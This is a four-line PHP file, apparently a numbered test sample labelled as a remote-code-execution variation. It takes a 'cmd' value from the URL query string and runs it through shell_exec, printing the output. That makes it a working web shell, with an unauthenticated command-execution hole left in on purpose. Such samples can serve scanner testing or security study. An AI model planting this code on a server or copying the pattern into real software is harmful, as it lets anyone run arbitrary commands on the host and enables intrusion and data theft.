<?php
// RCE test variation #416
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>